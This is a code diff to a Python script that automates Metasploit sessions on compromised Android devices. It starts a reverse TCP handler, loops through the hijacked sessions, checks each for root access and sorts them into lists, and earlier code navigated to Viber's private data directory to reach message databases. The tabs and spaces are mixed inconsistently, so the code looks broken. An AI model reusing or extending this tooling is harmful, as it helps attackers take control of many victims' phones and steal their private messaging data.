@@ -135,18 +135,31 @@ class Main:
     
     # wait for a response
     def wait_response(self, command):
-    	self.msfconsole.clr_response()
-    	self.msfconsole.exec_command(command)
-    	while True:
-        	if self.msfconsole.get_response():
-            		break
+        self.msfconsole.clr_response()
+        self.msfconsole.exec_command(command)
+        start_time = time.time()
+	while True:
+            if self.msfconsole.get_response():
+                break
+	    elapsed = time.time() - start_time
+	    if elapsed > 10:
+	    	return "timeout"
         return self.msfconsole.get_response()
-
+	
     # get sessions
     def get_sessions(self):
-      	outfile = open('list.txt','w')
+        outfile = open('list.txt','w')
         outfile.writelines(self.wait_response("sessions"))
         outfile.close()
+              	        
+    def get_root(self):
+        str = self.wait_response("check_root")
+	if str == "timeout":
+	    return False
+        if len(str.split()) == 5:
+            return False
+        return True
+			
     
     # Main Menu
     def main_menu(self):
@@ -187,47 +200,44 @@ class Main:
                 print self.msfconsole.get_response()
                 self.msfconsole.exec_command("exploit")
                 while True:
-                	if self.msfconsole.get_response().startswith("[*] Started reverse TCP handler on"):
-                		break
-                	print self.msfconsole.get_response()
-                	time.sleep(1)
+                    if self.msfconsole.get_response().startswith("[*] Started reverse TCP handler on"):
+                        break
+                    print self.msfconsole.get_response()
+                    time.sleep(1)
                 self.msfconsole.disconnect()
-                if self.msfconsole.connect() is False:
-            			sys.exit()
+                if self.msfconsole.connect() is False:sys.exit()
             		# Add directory auto completion
-        			readline.parse_and_bind("tab: complete")
+
+                readline.parse_and_bind("tab: complete")
 					# Go to main menu
-        			command = ""
+		command = ""
             
             # get all survive sessions
             if command == "sessions":
-            	self.get_sessions()
-            	command = ""
+                self.get_sessions()
+                command = ""
                 
             # try to get viber databases
             if command == "databases":
-            	self.get_sessions()
-            	infile = open('list.txt','r')
-		for i in range(6):
-			infile.readline()
-		
-		while True:
-			str = ""
-			str = infile.readline()
-			if len(str.split()) < 1:
-				break
-			tmpstr = self.wait_response("sessions " + str.split()[0])
-			if tmpstr.split()[0] == "[-]":
-				continue
-			command = "cd /data/data/com.viber.voip"
-			tmpstr = self.wait_response(command)
-			if tmpstr.split()[0] == "[-]":
-				self.wait_response("background")
-				continue
-			
-			self.wait_response("background")
-		
-		command = ""
+                self.get_sessions()
+                infile = open('list.txt','r')
+                outfile1 = open('root_list.txt','w')
+                outfile2 = open('unroot_list.txt','w')
+                for i in range(6):infile.readline()
+
+                while True:
+                    str = ""
+                    str = infile.readline()
+                    if len(str.split()) < 1:break
+                    tmpstr = self.wait_response("sessions " + str.split()[0])
+                    if tmpstr.split()[0] == "[-]":continue
+                    if self.get_root():outfile1.writelines(str)
+                    else:outfile2.writelines(str)
+                    self.wait_response("background")
+                command = ""
+		infile.close()
+		outfile1.close()
+		outfile2.close()
 
             # If command not empty send it to msfrpcd
             if command:
